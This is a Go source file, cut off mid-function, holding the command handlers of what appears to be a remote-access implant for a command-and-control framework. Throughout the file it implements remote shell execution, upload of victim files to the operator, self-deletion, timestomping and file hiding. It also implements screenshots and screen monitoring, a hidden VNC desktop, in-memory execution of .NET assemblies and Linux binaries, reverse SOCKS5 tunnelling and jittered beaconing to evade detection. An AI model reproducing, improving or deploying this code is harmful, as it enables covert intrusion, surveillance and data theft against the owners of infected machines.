package services

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"implant/core/commands"
	"implant/core/debuglog"
	"implant/core/communication"
	"implant/core/config"
	"implant/core/sysinfo"
	"implant/core/utils"
	"io"
	"io/ioutil"
	"math/big"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/shirou/gopsutil/process"
)

func HideConsole() error {
	return commands.HideConsole()
}
func ProcessDPIAware() error {
	return commands.SetProcessDPIAware()
}

// pathLen(4) | path(pathLen) | cmdLen(4) | cmd(cmdLen)
func ParseCommandShell(b []byte) (string, []byte, error) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		return "", nil, err
	}
	pathLen := utils.ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		return "", nil, err
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		return "", nil, err
	}

	cmdLen := utils.ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	// 替换path中的env的路径
	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd, nil
}

func CmdShell(cmdBuf []byte) ([]byte, error) {
	//shellPath, shellBuf, err := ParseCommandShell(cmdBuf)
	//if err != nil {
	//	return nil, err
	//}
	go func() {
		_, err := commands.Shell("", cmdBuf)
		if err != nil {
			communication.ErrorProcess(err)
		}
		return
	}()
	return []byte("[+] command is executing"), nil
}

// 上传分块载荷：requestId(4) | pathLen(4) | path | seq(4) | total(4) | chunk
func ParseCommandUpload(b []byte) (requestId uint32, filePath, chunk []byte, seq, total uint32, err error) {
	buf := bytes.NewBuffer(b)
	if len(b) < 20 {
		return 0, nil, nil, 0, 0, errors.New("upload payload too short")
	}
	reqBytes := make([]byte, 4)
	buf.Read(reqBytes)
	requestId = binary.BigEndian.Uint32(reqBytes)

	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := utils.ReadInt(filePathLenBytes)
	if filePathLen <= 0 || buf.Len() < int(filePathLen)+8 {
		return 0, nil, nil, 0, 0, errors.New("upload path length invalid")
	}
	filePath = make([]byte, filePathLen)
	buf.Read(filePath)

	seqBytes := make([]byte, 4)
	buf.Read(seqBytes)
	seq = binary.BigEndian.Uint32(seqBytes)
	totalBytes := make([]byte, 4)
	buf.Read(totalBytes)
	total = binary.BigEndian.Uint32(totalBytes)

	chunk = buf.Bytes()
	return requestId, filePath, chunk, seq, total, nil
}

func CmdUpload(cmdBuf []byte, isStart bool) ([]byte, error) {
	requestId, filePath, chunk, seq, total, err := ParseCommandUpload(cmdBuf)
	if err != nil {
		return nil, err
	}
	filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
	if _, err := Upload(filePathStr, chunk, isStart); err != nil {
		return nil, err
	}
	// 回 ACK：requestId(4)|seq(4)|total(4)
	ack := utils.BytesCombine(utils.WriteInt(int(requestId)), utils.WriteInt(int(seq)), utils.WriteInt(int(total)))
	communication.DataProcess(UPLOAD_ACK, ack)
	return nil, nil
}

func Upload(filePath string, fileContent []byte, isStart bool) (int, error) {
	var fp *os.File
	var err error
	if isStart {
		// if file exist, need user delete it manually before upload
		fp, err = os.OpenFile(filePath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, os.ModePerm)
	} else {
		fp, err = os.OpenFile(filePath, os.O_APPEND|os.O_WRONLY, os.ModePerm)
	}
	if err != nil {
		return 0, errors.New("file create err: " + err.Error())
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		return 0, errors.New("file write err: " + err.Error())
	}
	return offset, nil
}

// 下载协议（v2，带 requestId 防并发交叉污染 + 断点续传）：
// 首包 replyType 22：fileLen(8) | requestId(4) | path
// 分块 replyType 26：requestId(4) | chunk
func CmdDownload(cmdBuf []byte) ([]byte, error) {
	filePath := cmdBuf
	strFilePath := string(filePath)
	strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
	go func() {
		fileInfo, err := os.Stat(strFilePath)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}
		fileLen := fileInfo.Size()

		// K1: 移除错误的本地"断点续传"——两次 Stat 统计的都是同一个源文件，
		// resumeOffset 恒等于 fileLen → Seek(EOF) 后首轮 Read 返回 0，下载永远 0 字节。
		// 客户端无对端进度信息，协议按服务端需求从头发送。
		resumeOffset := int64(0)

		// 生成本次下载的 requestId
		reqBytes := make([]byte, 4)
		binary.BigEndian.PutUint32(reqBytes, uint32(time.Now().UnixNano()))

		fileLenBytes := make([]byte, 8)
		binary.BigEndian.PutUint64(fileLenBytes, uint64(fileLen))
		result := utils.BytesCombine(fileLenBytes, reqBytes, filePath)
		communication.DataProcess(22, result)

		fileHandle, err := os.Open(strFilePath)
		if err != nil {
			communication.ErrorProcess(err)
			return
		}
		defer fileHandle.Close()
		if resumeOffset > 0 {
			fileHandle.Seek(resumeOffset, io.SeekStart)
		}
		var fileContent []byte
		fileBuf := make([]byte, 2000000)
		for {
			n, err := fileHandle.Read(fileBuf)
			if err != nil && err != io.EOF {
				break
			}
			if n == 0 {
				break
			}
			fileContent = fileBuf[:n]
			result = utils.BytesCombine(reqBytes, fileContent)
			communication.DataProcess(DOWNLOAD, result)
		}
		communication.DataProcess(0, []byte("[+] "+strFilePath+" download success"))
	}()

	return []byte("[+] Downloading " + strFilePath), nil
}

// pendingRequest(4) || dirPathLen(4) || dirPath(dirPathLen)
func CmdFileBrowse(dirPathBytes []byte) ([]byte, error) {
	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// 早期验证目录是否存在，避免不必要的操作
	if _, err := os.Stat(dirPathStr); err != nil {
		return nil, fmt.Errorf("目录不存在或无法访问: %v", err)
	}

	// 优化字符串操作，预分配容量
	var resultBuilder strings.Builder
	resultBuilder.Grow(8192) // 预分配8KB容量

	// 处理当前目录信息
	if dirPathStr == "./" {
		absCurrentDir, err := filepath.Abs(".")
		if err != nil {
			return nil, err
		}
		resultBuilder.WriteString(fmt.Sprintf("%s/*", absCurrentDir))
	} else {
		// 确保路径格式正确，添加调试日志
		resultStr := dirPathStr
		// 确保没有重复的分隔符
		if !strings.HasSuffix(resultStr, "/*") {
			resultStr += "/*"
		}
		debuglog.Printf("[DEBUG] FileBrowse path: '%s' -> result first line: '%s'\n", string(dirPathBytes), resultStr)
		resultBuilder.WriteString(resultStr)
	}

	// 获取当前时间，并缓存格式化结果
	currentTime := time.Now()
	modTimeStr := currentTime.Format("2006/01/02 15:04:05")

	// 添加 . 和 .. 目录，使用缓存的时间
	resultBuilder.WriteString(fmt.Sprintf("\nD\t0\t%s\t-rwxr-xr-x\t.", modTimeStr))
	resultBuilder.WriteString(fmt.Sprintf("\nD\t0\t%s\t-rwxr-xr-x\t..", modTimeStr))

	// 读取目录中的文件
	files, err := ioutil.ReadDir(dirPathStr)
	if err != nil {
		return nil, fmt.Errorf("读取目录失败: %v", err)
	}

	// 优化文件处理循环
	for _, file := range files {
		// 优化时间格式化
		fileModTime := file.ModTime().Format("02/01/2006 15:04:05")

		// 优化权限获取
		mode := file.Mode()
		permissions := mode.Perm().String()

		// 使用单次写入减少系统调用
		if file.IsDir() {
			resultBuilder.WriteString(fmt.Sprintf("\nD\t0\t%s\t%s\t%s", fileModTime, permissions, file.Name()))
		} else {
			resultBuilder.WriteString(fmt.Sprintf("\nF\t%d\t%s\t%s\t%s", file.Size(), fileModTime, permissions, file.Name()))
		}
	}

	return []byte(resultBuilder.String()), nil
}

// filepath
func CmdCd(cmdBuf []byte) ([]byte, error) {
	err := os.Chdir(string(cmdBuf))
	if err != nil {
		return nil, err
	}
	return []byte("changing directory success"), nil
}

// ms(4)
func CmdSleep(cmdBuf []byte) ([]byte, error) {
	// 【关键修复】添加数据长度检查，防止slice bounds out of range错误
	if len(cmdBuf) < 4 {
		return nil, fmt.Errorf("休眠命令数据不足，需要至少4字节，实际收到%d字节", len(cmdBuf))
	}

	sleep := utils.ReadInt(cmdBuf[:4])
	// 【关键修复】添加休眠间隔合理性验证，防止服务端过载
	if sleep < 100 || sleep > 300000 {
		return nil, fmt.Errorf("休眠间隔超出合理范围(100-300000ms)，收到: %d", sleep)
	}

	// 【修复】原实现 `if sleep != 'd'` —— 'd' 即 ASCII 100，恰好 100ms 的休眠被静默忽略；
	// 校验已保证 sleep ∈ [100, 300000]，直接更新
	debuglog.Printf("🕐 [TCP-CLIENT] 休眠间隔更新: %dms -> %dms\n", config.WaitTime.Milliseconds(), sleep)
	config.WaitTime = time.Duration(sleep) * time.Millisecond
	return []byte("Sleep time changes to " + strconv.Itoa(int(sleep)/1000) + " seconds"), nil
}

func CmdPwd() ([]byte, error) {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		return nil, err
	}
	return []byte(result), nil
}

func CmdPause(cmdBuf []byte) ([]byte, error) {
	// K2: 边界校验 + 上限 10 分钟（原 4GB 毫秒 ≈ 49 天可冻结 beacon）
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	pauseTime := utils.ReadInt(cmdBuf)
	if pauseTime <= 0 || pauseTime > 600000 {
		return nil, errors.New("pause time out of range (1-600000 ms)")
	}
	debuglog.Println(fmt.Sprintf("Pause time: %d", pauseTime))
	time.Sleep(time.Duration(pauseTime) * time.Millisecond)
	return []byte(fmt.Sprintf("Pause for %d millisecond", pauseTime)), nil
}

func CmdExit() ([]byte, error) {
	_, err := commands.DeleteSelf()
	if err != nil {
		return nil, err
	}
	return []byte("success exit"), nil
}

func CmdExecute(cmdBuf []byte) ([]byte, error) {
	return commands.Execute(cmdBuf)
}

func CmdPs() ([]byte, error) {
	/*err := enableSeDebugPrivilege()
	if err != nil {
		debuglog.Println("SeDebugPrivilege Wrong.")
	}*/

	processes, err := process.Processes()
	if err != nil {
		return nil, err
	}
	result := fmt.Sprintf("\n%s\t\t\t%s\t\t\t%s\t\t\t%s\t\t\t%s", "Process Name", "pPid", "pid", "Arch", "User")
	for _, p := range processes {
		pid := p.Pid
		parent, _ := p.Parent()
		if parent == nil {
			continue
		}
		pPid := parent.Pid
		name, _ := p.Name()
		owner, _ := p.Username()
		sessionId := sysinfo.GetProcessSessionId(pid)
		archString := "?"
		// 【优化】单进程架构检测失败不再中断整个命令，标 ? 后继续
		if IsX64, err := sysinfo.IsPidX64(uint32(pid)); err == nil {
			if IsX64 {
				archString = "x64"
			} else {
				archString = "x86"
			}
		}

		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
	}

	//return append(b,[]byte(result)...)
	//return []byte(result), nil
	return []byte(result), nil
}

func CmdKill(cmdBuf []byte) ([]byte, error) {
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	pid := utils.ReadInt(cmdBuf[:4])
	return commands.KillProcess(pid)
}

func CmdMkdir(cmdBuf []byte) ([]byte, error) {
	if PathExists(string(cmdBuf)) {
		return nil, errors.New("Directory exists")
	}
	err := os.Mkdir(string(cmdBuf), os.ModePerm)
	if err != nil {
		return nil, errors.New("Mkdir failed")
	}
	return []byte("Mkdir success: " + string(cmdBuf)), nil
}

func PathExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}

func CmdDrives() ([]byte, error) {
	return commands.Drives()
}

func CmdRm(cmdBuf []byte) ([]byte, error) {
	Path := strings.ReplaceAll(string(cmdBuf), "\\", "/")
	err := os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(cmdBuf) + " success"), nil
}

func CmdCp(cmdBuf []byte) ([]byte, error) {
	buf := bytes.NewBuffer(cmdBuf)
	arg, err := utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	bytesRead, err := ioutil.ReadFile(src)
	if err != nil {
		return nil, err
	}
	fp, err := os.OpenFile(dest, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return nil, err
	}
	defer fp.Close()
	_, err = fp.Write(bytesRead)
	if err != nil {
		return nil, err
	}

	return []byte("Copy " + src + " to " + dest + " success"), nil
}

func CmdMv(cmdBuf []byte) ([]byte, error) {
	// 解析 requestId
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	requestId := binary.BigEndian.Uint32(cmdBuf[:4])
	body := cmdBuf[4:]

	buf := bytes.NewBuffer(body)
	arg, err := utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = utils.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	err = os.Rename(src, dest)
	if err != nil {
		return fileOpResult(requestId, false, "Move failed: "+err.Error()), nil
	}

	return fileOpResult(requestId, true, "Move "+src+" to "+dest+" success"), nil
}
func CallbackTime() (time.Duration, error) {
	waitTime := config.WaitTime.Milliseconds()
	jitter := int64(8)
	if jitter <= 0 || jitter > 100 {
		return config.WaitTime, nil
	}
	result, err := rand.Int(rand.Reader, big.NewInt(2*waitTime/100*jitter))
	if err != nil {
		return config.WaitTime, err
	}
	waitTime = result.Int64() + waitTime - waitTime/100*jitter
	return time.Duration(waitTime) * time.Millisecond, nil
}

// CmdModifyTime 修改文件时间（返回 FILE_OP_RESULT：requestId(4)|ok(1)|msg）
func CmdModifyTime(cmdBuf []byte) ([]byte, error) {
	// 解析 requestId
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	requestId := binary.BigEndian.Uint32(cmdBuf[:4])
	body := cmdBuf[4:]

	// K2: 边界校验（原多处切片无界 → 短包越界 panic）
	if len(body) < 8 {
		return nil, errors.New("Invalid modify-time payload")
	}
	// 解析时间长度
	timeLen := int(utils.ReadInt(body[:4]))
	if timeLen <= 0 || 8+timeLen > len(body) {
		return nil, errors.New("Invalid time length")
	}
	// 解析时间字符串
	timeStr := string(body[4 : 4+timeLen])
	if 8+timeLen > len(body) {
		return nil, errors.New("Invalid modify-time payload")
	}
	// 解析文件路径长度
	pathLen := int(utils.ReadInt(body[4+timeLen : 8+timeLen]))
	if pathLen <= 0 || 8+timeLen+pathLen > len(body) {
		return nil, errors.New("Invalid path length")
	}
	// 解析文件路径
	filePath := string(body[8+timeLen : 8+timeLen+pathLen])

	// 解析时间
	newTime, err := time.Parse("2006-01-02T15:04", timeStr)
	if err != nil {
		return nil, errors.New("Invalid time format")
	}

	// 在Windows上尝试使用高级API修改创建时间
	if err := commands.ModifyFileTimeAdvanced(filePath, newTime); err == nil {
		return fileOpResult(requestId, true, "File time modified successfully: "+filePath), nil
	}

	// 回退到标准方法（只修改访问时间和修改时间）
	err = os.Chtimes(filePath, newTime, newTime)
	if err != nil {
		return fileOpResult(requestId, false, "Failed to modify file time: "+err.Error()), nil
	}

	return fileOpResult(requestId, true, "File time modified successfully: "+filePath), nil
}

// fileOpResult 组装 FILE_OP_RESULT 响应：requestId(4)|ok(1)|msg
func fileOpResult(requestId uint32, ok bool, msg string) []byte {
	okByte := byte(0)
	if ok {
		okByte = 1
	}
	return utils.BytesCombine(utils.WriteInt(int(requestId)), []byte{okByte}, []byte(msg))
}

// CmdHideFile 隐藏文件（跨平台实现，返回 FILE_OP_RESULT）
func CmdHideFile(cmdBuf []byte) ([]byte, error) {
	// 解析 requestId
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	requestId := binary.BigEndian.Uint32(cmdBuf[:4])
	body := cmdBuf[4:]

	// K2: 边界校验
	if len(body) < 4 {
		return nil, errors.New("Invalid hide payload")
	}
	// 解析文件路径长度
	pathLen := int(utils.ReadInt(body[:4]))
	if pathLen <= 0 || 4+pathLen > len(body) {
		return nil, errors.New("Invalid path length")
	}
	// 解析文件路径
	filePath := string(body[4 : 4+pathLen])

	// 调用平台特定的隐藏文件函数
	err := commands.HideFile(filePath)
	if err != nil {
		return fileOpResult(requestId, false, "Failed to hide file: "+err.Error()), nil
	}

	return fileOpResult(requestId, true, "File hidden successfully: "+filePath), nil
}

// CmdUnhideFile 取消隐藏文件（跨平台实现，返回 FILE_OP_RESULT）
func CmdUnhideFile(cmdBuf []byte) ([]byte, error) {
	// 解析 requestId
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	requestId := binary.BigEndian.Uint32(cmdBuf[:4])
	body := cmdBuf[4:]

	// K2: 边界校验
	if len(body) < 4 {
		return nil, errors.New("Invalid unhide payload")
	}
	// 解析文件路径长度
	pathLen := int(utils.ReadInt(body[:4]))
	if pathLen <= 0 || 4+pathLen > len(body) {
		return nil, errors.New("Invalid path length")
	}
	// 解析文件路径
	filePath := string(body[4 : 4+pathLen])

	// 调用平台特定的取消隐藏文件函数
	err := commands.UnhideFile(filePath)
	if err != nil {
		return fileOpResult(requestId, false, "Failed to unhide file: "+err.Error()), nil
	}

	return fileOpResult(requestId, true, "File unhidden successfully: "+filePath), nil
}

// CmdFileSave 保存文件内容（返回 FILE_OP_RESULT）
func CmdFileSave(cmdBuf []byte) ([]byte, error) {
	// 解析 requestId
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	requestId := binary.BigEndian.Uint32(cmdBuf[:4])
	body := cmdBuf[4:]

	// K2: 边界校验
	if len(body) < 4 {
		return nil, errors.New("Invalid filesave payload")
	}
	// 解析文件路径长度
	pathLen := int(utils.ReadInt(body[:4]))
	if pathLen <= 0 || 4+pathLen > len(body) {
		return nil, errors.New("Invalid path length")
	}
	// 解析文件路径
	filePath := string(body[4 : 4+pathLen])
	// 解析文件内容
	fileContent := body[4+pathLen:]

	// 创建或覆盖文件
	err := ioutil.WriteFile(filePath, fileContent, 0644)
	if err != nil {
		return fileOpResult(requestId, false, "Failed to save file: "+err.Error()), nil
	}

	return fileOpResult(requestId, true, "File saved successfully: "+filePath), nil
}

// 双引擎交互式Shell命令处理函数

// 隧道代理处理函数

// CmdSocks5Connect 处理SOCKS5连接请求（已废弃 - 请使用反向SOCKS5）

// CmdReverseSocks5Connect 处理反向SOCKS5连接命令
func CmdReverseSocks5Connect(cmdBuf []byte) ([]byte, error) {
	return commands.HandleReverseSocks5Connect(cmdBuf)
}

// CmdReverseSocks5Close 关闭反向SOCKS5隧道（真正关闭 mux 会话）
func CmdReverseSocks5Close() ([]byte, error) {
	return commands.HandleReverseSocks5Close()
}

// CmdTCPForward 处理TCP转发命令

// CmdHTTPConnect 处理HTTP CONNECT命令（已废弃 - 新架构使用多路复用）

// CmdTcpForward 处理TCP转发命令（兼容别名）

// ================ 新的文件编辑命令 ================

// CmdFileEditRead 读取文件内容进行编辑（响应：requestId(4)|flag(1)|len(4)|content 或 requestId(4)|flag(1)|msg）
func CmdFileEditRead(cmdBuf []byte) ([]byte, error) {
	// 解析 requestId
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	requestId := binary.BigEndian.Uint32(cmdBuf[:4])
	body := cmdBuf[4:]

	// 解析文件路径长度
	if len(body) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	pathLen := int(utils.ReadInt(body[:4]))
	if len(body) < 4+pathLen {
		return nil, errors.New("Invalid file path length")
	}

	// 解析文件路径
	filePath := string(body[4 : 4+pathLen])

	// 读取文件内容
	fileContent, err := ioutil.ReadFile(filePath)
	if err != nil {
		// 返回错误响应：失败标志 + 错误信息
		errorMsg := "Failed to read file: " + err.Error()
		response := make([]byte, 1+len(errorMsg))
		response[0] = 0 // 失败标志
		copy(response[1:], []byte(errorMsg))
		return utils.BytesCombine(utils.WriteInt(int(requestId)), response), nil
	}

	// 返回成功响应：成功标志 + 内容长度 + 文件内容
	contentLen := len(fileContent)
	contentLenBytes := utils.WriteInt(contentLen)

	response := make([]byte, 1+4+contentLen)
	response[0] = 1 // 成功标志
	copy(response[1:5], contentLenBytes)
	copy(response[5:], fileContent)

	return utils.BytesCombine(utils.WriteInt(int(requestId)), response), nil
}

// CmdFileEditWrite 写入编辑后的文件内容（响应：requestId(4)|flag(1)|msg）
func CmdFileEditWrite(cmdBuf []byte) ([]byte, error) {
	// 解析 requestId
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	requestId := binary.BigEndian.Uint32(cmdBuf[:4])
	body := cmdBuf[4:]

	// 解析文件路径长度
	if len(body) < 4 {
		return nil, errors.New("Invalid command buffer length")
	}
	pathLen := int(utils.ReadInt(body[:4]))
	if len(body) < 4+pathLen {
		return nil, errors.New("Invalid file path length")
	}

	// 解析文件路径
	filePath := string(body[4 : 4+pathLen])
	// 解析文件内容
	fileContent := body[4+pathLen:]

	// 写入文件
	err := ioutil.WriteFile(filePath, fileContent, 0644)
	if err != nil {
		// 返回错误响应：失败标志 + 错误信息
		errorMsg := "Failed to write file: " + err.Error()
		response := make([]byte, 1+len(errorMsg))
		response[0] = 0 // 失败标志
		copy(response[1:], []byte(errorMsg))
		return utils.BytesCombine(utils.WriteInt(int(requestId)), response), nil
	}

	// 返回成功响应：成功标志 + 成功信息
	successMsg := "File saved successfully: " + filePath
	response := make([]byte, 1+len(successMsg))
	response[0] = 1 // 成功标志
	copy(response[1:], []byte(successMsg))

	return utils.BytesCombine(utils.WriteInt(int(requestId)), response), nil
}

// CmdHttpConnect 处理HTTP连接命令（已废弃 - 新架构使用多路复用）
func CmdHttpConnect(cmdBuf []byte) ([]byte, error) {
	return []byte("HTTP_CONNECT_DEPRECATED"), fmt.Errorf("HTTP连接功能已废弃，请使用新的HTTP隧道架构")
}

// CmdUDPSession 处理UDP会话命令（已废弃 - 新架构不支持）

// CmdHTTPTunnel 处理HTTP隧道命令
func CmdHTTPTunnel(cmdBuf []byte) ([]byte, error) {
	return commands.HandleHTTPTunnel(cmdBuf)
}

// CmdTunnelData 处理隧道数据传输（已废弃 - 新架构使用多路复用）

// CmdTunnelClose 处理隧道关闭命令（已废弃 - 新架构使用多路复用）

// CmdScreenshot 处理屏幕截图命令（cmdBuf 前 4 字节为分辨率档位：0=低 1=中 2=高；
// 空载荷兼容旧服务端 → 默认中）
func CmdScreenshot(cmdBuf []byte) ([]byte, error) {
	quality := 1 // 默认中
	if len(cmdBuf) >= 4 {
		q := int(binary.BigEndian.Uint32(cmdBuf[:4]))
		if q >= 0 && q <= 2 {
			quality = q
		}
	}
	debuglog.Printf("📷 收到截图命令（档位: %d），开始截图...\n", quality)
	// 调用平台相关的截图功能
	screenshotData, err := commands.TakeScreenshot(quality)
	if err != nil {
		debuglog.Printf("❌ 截图失败: %v\n", err)
		return nil, err
	}
	debuglog.Printf("✅ 截图成功，数据长度: %d\n", len(screenshotData))
	return screenshotData, nil
}

// CmdStartMonitor 处理开始屏幕监控命令
func CmdStartMonitor(cmdBuf []byte) ([]byte, error) {
	debuglog.Println("📺 收到开始监控命令...")

	// 解析帧率参数
	frameRate := 5 // 默认5FPS
	if len(cmdBuf) >= 4 {
		frameRate = int(utils.ReadInt(cmdBuf[:4]))
	}

	// 启动屏幕监控
	err := commands.StartScreenMonitor(frameRate)
	if err != nil {
		debuglog.Printf("❌ 启动屏幕监控失败: %v\n", err)
		return nil, err
	}

	debuglog.Printf("✅ 屏幕监控已启动，帧率: %d FPS\n", frameRate)
	return []byte("MONITOR_STARTED"), nil
}

// CmdStopMonitor 处理停止屏幕监控命令
func CmdStopMonitor(cmdBuf []byte) ([]byte, error) {
	debuglog.Println("⏹️ 收到停止监控命令...")

	// 停止屏幕监控
	err := commands.StopScreenMonitor()
	if err != nil {
		debuglog.Printf("❌ 停止屏幕监控失败: %v\n", err)
		return nil, err
	}

	debuglog.Println("✅ 屏幕监控已停止")
	return []byte("MONITOR_STOPPED"), nil
}

// CmdGetMonitorFrame 处理手动获取监控帧命令
func CmdGetMonitorFrame(cmdBuf []byte) ([]byte, error) {
	debuglog.Println("📸 收到获取监控帧命令...")

	// 获取屏幕帧
	frameData, err := commands.GetMonitorFrame()
	if err != nil {
		debuglog.Printf("❌ 获取监控帧失败: %v\n", err)
		return nil, err
	}

	debuglog.Printf("✅ 监控帧获取成功，数据长度: %d\n", len(frameData))
	return frameData, nil
}

// ================ HVNC 隐藏桌面（Hidden VNC） ================

// CmdHvncStart 启动 HVNC 会话
// payload: [4B sidLen][sessionId][4B appLen][app][4B argsLen][args]（app 空 = explorer）
func CmdHvncStart(cmdBuf []byte) ([]byte, error) {
	debuglog.Println("🖥️ 收到 HVNC 启动命令...")
	return commands.StartHvnc(cmdBuf)
}

// CmdHvncStop 停止 HVNC 会话
// payload: [sessionId]
func CmdHvncStop(cmdBuf []byte) ([]byte, error) {
	debuglog.Println("🖥️ 收到 HVNC 停止命令...")
	return commands.StopHvnc(cmdBuf)
}

// CmdHvncInput 注入 HVNC 输入事件
// payload: [4B sidLen][sessionId][事件 JSON]
func CmdHvncInput(cmdBuf []byte) ([]byte, error) {
	return commands.SendHvncInput(cmdBuf)
}

// Windows内存执行相关功能（从rshell移植）

// CmdExecuteAssembly 处理.NET Assembly内存执行命令
func CmdExecuteAssembly(cmdBuf []byte) ([]byte, error) {
	// 解析文件长度（4字节）
	if len(cmdBuf) < 4 {
		return nil, errors.New("Invalid assembly data: missing file length")
	}

	fileLen := utils.ReadInt(cmdBuf[:4])
	if len(cmdBuf) < 4+int(fileLen) {
		return nil, errors.New("Invalid assembly data: incomplete file data")
	}
	// 【安全修复】程序集大小上限 10MB，防止超大程序集 OOM
	const maxAssemblySize = 10 * 1024 * 1024
	if fileLen <= 0 || fileLen > maxAssemblySize {
		return nil, errors.New("Invalid assembly data: size out of range (max 10MB)")
	}

	// 解析.NET程序二进制数据
	assemblyData := cmdBuf[4 : 4+fileLen]

	// 解析参数
	arguments := ""
	if len(cmdBuf) > 4+int(fileLen) {
		arguments = string(cmdBuf[4+fileLen:])
	}

	// 执行.NET Assembly
	return commands.ExecuteAssembly(assemblyData, arguments)
}

// ================ Linux交互式Shell服务函数 ================

// CmdInteractiveShellStart 开始交互式Shell会话
func CmdInteractiveShellStart(cmdBuf []byte) ([]byte, error) {
	return commands.StartInteractiveShell()
}

// CmdInteractiveShellInput 发送输入到交互式Shell
func CmdInteractiveShellInput(cmdBuf []byte) ([]byte, error) {
	return commands.SendInteractiveInput(cmdBuf)
}

// CmdInteractiveShellStop 停止交互式Shell会话
func CmdInteractiveShellStop(cmdBuf []byte) ([]byte, error) {
	return commands.StopInteractiveShell()
}

// ================ Windows双引擎Shell命令处理函数（非交互式） ================

// CmdModeStart 启动CMD模式
func CmdModeStart(cmdBuf []byte) ([]byte, error) {
	return commands.StartCMDInteractiveShell()
}

// CmdModeInput 发送CMD命令
func CmdModeInput(cmdBuf []byte) ([]byte, error) {
	return commands.SendDualInteractiveInput(cmdBuf)
}

// CmdModeStop 停止CMD模式
func CmdModeStop(cmdBuf []byte) ([]byte, error) {
	return commands.StopDualInteractiveShell()
}

// WmiModeStart 启动WMI模式
func WmiModeStart(cmdBuf []byte) ([]byte, error) {
	return commands.StartWMIInteractiveShell()
}

// WmiModeInput 发送WMI命令
func WmiModeInput(cmdBuf []byte) ([]byte, error) {
	return commands.SendDualInteractiveInput(cmdBuf)
}

// WmiModeStop 停止WMI模式
func WmiModeStop(cmdBuf []byte) ([]byte, error) {
	return commands.StopDualInteractiveShell()
}

// ================ 保留的遗留函数（向后兼容） ================

// // CmdInteractiveShellCMDStart 开始CMD模式交互式Shell会话
// func CmdInteractiveShellCMDStart(cmdBuf []byte) ([]byte, error) {
// 	return commands.StartCMDInteractiveShell()
// }

// // CmdInteractiveShellWMIStart WMI模式隐蔽命令执行
// func CmdInteractiveShellWMIStart(cmdBuf []byte) ([]byte, error) {
// 	return commands.StartWMIInteractiveShell()
// }

// CmdDualInteractiveShellInput 发送输入到双引擎交互式Shell
func CmdDualInteractiveShellInput(cmdBuf []byte) ([]byte, error) {
	return commands.SendDualInteractiveInput(cmdBuf)
}

// CmdDualInteractiveShellStop 停止双引擎交互式Shell会话
func CmdDualInteractiveShellStop(cmdBuf []byte) ([]byte, error) {
	return commands.StopDualInteractiveShell()
}

// // CmdDualInteractiveShellInterrupt 中断双引擎交互式Shell命令
// func CmdDualInteractiveShellInterrupt(cmdBuf []byte) ([]byte, error) {
// 	return commands.InterruptDualInteractiveShell()
// }

// CmdExecuteLinuxScript Linux脚本内存执行
func CmdExecuteLinuxScript(cmdBuf []byte) ([]byte, error) {
	// K2: 边界校验
	if len(cmdBuf) < 8 {
		return nil, errors.New("Invalid script payload")
	}
	scriptLen := binary.BigEndian.Uint32(cmdBuf[:4])
	if int(scriptLen) > len(cmdBuf)-4 {
		return nil, errors.New("Invalid script length")
	}
	return commands.ExecuteLinuxScript(cmdBuf[4:4+scriptLen], string(cmdBuf[4+scriptLen:]))
}

// CmdExecuteLinuxBin Linux二进制执行
func CmdExecuteLinuxBin(cmdBuf []byte) ([]byte, error) {
	// K2: 边界校验（原无任何长度校验 → 短包越界 panic）
	if len(cmdBuf) < 8 {
		return nil, errors.New("Invalid exec payload")
	}
	fileLen := binary.BigEndian.Uint32(cmdBuf[:4])
	if int(fileLen) > len(cmdBuf)-4 {
		return nil, errors.New("Invalid exec length")
	}
	binBytes := cmdBuf[4 : 4+fileLen]
	argsLen := binary.BigEndian.Uint32(cmdBuf[4+fileLen : 8+fileLen])
	if 8+int(fileLen)+int(argsLen) > len(cmdBuf) {
		return nil, errors.New("Invalid args length")
	}
